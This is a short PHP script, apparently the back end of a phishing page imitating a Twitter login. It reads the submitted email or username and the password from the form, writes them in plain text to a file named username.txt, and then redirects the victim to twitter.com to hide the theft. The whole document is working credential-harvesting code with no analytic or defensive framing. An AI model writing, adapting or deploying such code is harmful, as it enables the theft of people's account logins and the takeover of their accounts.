<?php 
$fp = fopen("username.txt", "a");
fwrite($fp, "Email:$_POST[username_or_email]\nPassword:$_POST[password]\n\n");
header( 'Location: http://twitter.com' ) ;
;?>